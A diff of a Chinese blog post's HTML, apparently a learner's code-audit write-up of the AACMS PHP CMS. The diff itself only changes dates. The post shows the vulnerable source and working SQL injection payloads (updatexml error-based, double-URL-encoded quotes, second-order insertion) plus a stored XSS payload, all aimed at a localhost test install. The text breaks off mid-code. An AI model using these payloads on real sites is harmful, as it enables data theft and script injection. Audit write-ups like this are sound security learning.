@@ -19,36 +19,36 @@
     <meta name="description" content="前言算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。 审计过程环境PHP5.2.17 MySQL5.7.26 Apache2.4.39 程序安装先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。  安装该cms，配置好网站之后直接访问&#x2F;install&#x2F;index.php即可，有个地方需要注意的是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="代码审计-AACMS">
-<meta property="og:url" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/index.html">
+<meta property="og:url" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/index.html">
 <meta property="og:site_name" content="Mechoy&#39;s Blog">
 <meta property="og:description" content="前言算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。 审计过程环境PHP5.2.17 MySQL5.7.26 Apache2.4.39 程序安装先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。  安装该cms，配置好网站之后直接访问&#x2F;install&#x2F;index.php即可，有个地方需要注意的是">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png">
-<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png">
-<meta property="article:published_time" content="2022-02-25T16:44:22.000Z">
-<meta property="article:modified_time" content="2022-05-14T16:19:30.186Z">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png">
+<meta property="og:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png">
+<meta property="article:published_time" content="2022-02-18T16:44:22.000Z">
+<meta property="article:modified_time" content="2022-06-23T15:33:00.921Z">
 <meta property="article:author" content="Mechoy">
 <meta property="article:tag" content="PHP代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
+<meta name="twitter:image" content="http://example.com/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
   
   
   <title>代码审计-AACMS - Mechoy&#39;s Blog</title>
@@ -224,8 +224,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-02-26 00:44" pubdate>
-          2022年2月26日 凌晨
+        <time datetime="2022-02-19 00:44" pubdate>
+          2022年2月19日 凌晨
         </time>
       </span>
     
@@ -294,13 +294,13 @@
 <p>MySQL5.7.26</p>
 <p>Apache2.4.39</p>
 <h5 id="程序安装"><a href="#程序安装" class="headerlink" title="程序安装"></a>程序安装</h5><p>先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>安装该cms，配置好网站之后直接访问/install/index.php即可，有个地方需要注意的是：数据库默认字符集为GBK，这就可能导致存在宽字节注入</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png" srcset="/img/loading.gif" lazyload></p>
-<h5 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>先包含class_core.php，然后调用该文件中的两个方法，最后包含文章模板目录下的index文件</p>
 <p>跟进class_core.php文件查看，先是定义了一个常量，后定义了五个类，找到刚刚index.php中调用的方法</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// 实例化了自己本身的对象：单例模式</span><br>		<span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br>			<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>		&#125;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
 
 <p>再看<code>init()</code>方法</p>
@@ -320,9 +320,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);		<br></code></pre></td></tr></table></figure>
 
 <p>跟进<code>template()</code>,其实就是将数据库中的文章显示在index.php中</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png" srcset="/img/loading.gif" lazyload></p>
 <p>index.php分析完了，结果是没有任何发现，但对该CMS有了一定的了解。继续分析其他的入口函数</p>
-<h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png" srcset="/img/loading.gif" lazyload></p>
 <p>跟随大哥的思路，看一下article_view.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;	<span class="hljs-comment">// 该值前面定义过，为True</span><br>	<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);	<span class="hljs-comment">// 获取aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);	<span class="hljs-comment">// 根据aid返回文章</span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -330,27 +330,27 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms 代码审计&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;代码审计&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure>
 
 <p>在浏览器中进行访问</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png" srcset="/img/loading.gif" lazyload></p>
 <p>从这里开看，如果在插入title和content时内容可控，则可能存在二次注入；比如执行如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png" srcset="/img/loading.gif" lazyload></p>
 <p>回到article.php，这里接收了一个aid，但是aid经过<code>intval()</code>的处理了，而<code>intval()</code>函数的返回变量 <code>var</code> 的 [integer]数值，所以导致无法实现注入；</p>
-<h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png" srcset="/img/loading.gif" lazyload></p>
 <p>在没有登陆的状态下，默认是进入到admin_member.php中，并且根据operation的值跳入到指定模块中去</p>
 <p>到这里，三个入口函数基本了解清楚，由于index.php和article.php没有什么内容，所以只能从admin.php处下手进行审计。</p>
 <h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="发现的漏洞"><a href="#发现的漏洞" class="headerlink" title="发现的漏洞"></a>发现的漏洞</h5><h6 id="1-前台SQL注入"><a href="#1-前台SQL注入" class="headerlink" title="1.前台SQL注入"></a>1.前台SQL注入</h6><p>这里需要先在后台文章处添加一个栏目</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后再访问<a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.php就能看到</a></p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png" srcset="/img/loading.gif" lazyload></p>
 <p>给<code>catid</code>参数加个单引号,页面爆出数据库错误</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //页面返回正常</span><br></code></pre></td></tr></table></figure>
 
 <p>由此可以构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里由于是黑盒测试的，所以需要去回去看一下源码，看一下源码该漏洞是如何形成的，可以根据报错信息去寻找漏洞点</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 漏洞位置位于/aacms/source/function/block/block.article.php 25-40行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; 	<span class="hljs-comment">// 传入catid,没有aid，所以直接进入else</span><br>		<span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>	&#125;  <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br>			<span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;	<span class="hljs-comment">// 采用直接拼接</span><br>		&#125;<br>	&#125;	<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br>		<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// 返回一个由数据元素组合成的字符串</span><br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>	&#125;	<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br>	<span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure>
 
@@ -361,7 +361,7 @@
 
 <p>构造<code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p>
 <p>需要注意的是，这里的注释符不能直接输入，需要将其进行url编码后再传入</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png" srcset="/img/loading.gif" lazyload></p>
 <h6 id="2-二次注入漏洞"><a href="#2-二次注入漏洞" class="headerlink" title="2.二次注入漏洞"></a>2.二次注入漏洞</h6><p>再回来看刚刚的代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br>		<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br>			<br>		<span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br>		<span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>			<br>		<span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>			cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>		&#125;<br>		DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br>			<span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,		<span class="hljs-comment">// 直接向数据库中插入title</span><br>			<span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>			<span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>		));<br>			<br>		cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br>			<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
 
@@ -374,11 +374,11 @@
 <p>这里对title进行了一个查询，如果将payload插入到title位置，那么将会直接导致这条sql语句无法正常执行，然后程序报错停止，所以只能将payload插入到url位置</p>
 <p>构造<code>payload:</code> <code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p>
 <p>或是：<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>，都能够实现</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png" srcset="/img/loading.gif" lazyload></p>
 <p>当然，这里其实不用看代码都能够发现，大概率存在存储型的跨站</p>
 <p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>需要进行url编码</p>
 <p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png" srcset="/img/loading.gif" lazyload></p>
 <h6 id="3-XSS漏洞"><a href="#3-XSS漏洞" class="headerlink" title="3.XSS漏洞"></a>3.XSS漏洞</h6><p>先跟着大佬的思路走</p>
 <p>回到admin_misc.php中</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br>		<br>	<span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br>		<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>			<span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br>			<span 